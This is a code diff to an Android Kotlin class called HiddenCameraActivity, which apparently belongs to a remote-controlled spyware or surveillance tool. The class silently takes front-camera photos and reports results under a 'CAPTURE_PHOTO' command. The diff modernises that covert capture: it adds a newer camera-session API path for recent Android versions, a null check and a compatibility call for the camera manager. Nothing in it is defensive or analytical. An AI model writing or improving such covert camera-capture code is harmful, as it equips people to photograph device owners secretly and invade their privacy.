@@ -67,7 +67,7 @@ class HiddenCameraActivity : Activity() {
     }
 
     private fun takePicture() {
-        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val manager = androidx.core.content.ContextCompat.getSystemService(this, CameraManager::class.java)!!
         try {
             val cameraId = manager.cameraIdList.firstOrNull { id ->
                 manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
@@ -88,6 +88,7 @@ class HiddenCameraActivity : Activity() {
                     var image: Image? = null
                     try {
                         image = reader.acquireLatestImage()
+                        if (image == null) return@setOnImageAvailableListener
                         val buffer: ByteBuffer = image.planes[0].buffer
                         val bytes = ByteArray(buffer.capacity())
                         buffer.get(bytes)
@@ -169,22 +170,46 @@ class HiddenCameraActivity : Activity() {
             val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
             captureBuilder?.addTarget(surface)
 
-            cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
-                override fun onConfigured(session: CameraCaptureSession) {
-                    if (cameraDevice == null) return
-                    try {
-                        session.capture(captureBuilder!!.build(), null, backgroundHandler)
-                    } catch (e: CameraAccessException) {
-                        postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                val config = android.hardware.camera2.params.SessionConfiguration(
+                    android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
+                    listOf(android.hardware.camera2.params.OutputConfiguration(surface)),
+                    java.util.concurrent.Executor { command -> backgroundHandler?.post(command) },
+                    object : CameraCaptureSession.StateCallback() {
+                        override fun onConfigured(session: CameraCaptureSession) {
+                            if (cameraDevice == null) return
+                            try {
+                                session.capture(captureBuilder!!.build(), null, backgroundHandler)
+                            } catch (e: CameraAccessException) {
+                                postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
+                                finish()
+                            }
+                        }
+                        override fun onConfigureFailed(session: CameraCaptureSession) {
+                            postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
+                            finish()
+                        }
+                    }
+                )
+                cameraDevice?.createCaptureSession(config)
+            } else {
+                @Suppress("DEPRECATION")
+                cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        if (cameraDevice == null) return
+                        try {
+                            session.capture(captureBuilder!!.build(), null, backgroundHandler)
+                        } catch (e: CameraAccessException) {
+                            postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
+                            finish()
+                        }
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
                         finish()
                     }
-                }
-
-                override fun onConfigureFailed(session: CameraCaptureSession) {
-                    postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
-                    finish()
-                }
-            }, backgroundHandler)
+                }, backgroundHandler)
+            }
         } catch (e: CameraAccessException) {
             e.printStackTrace()
         }
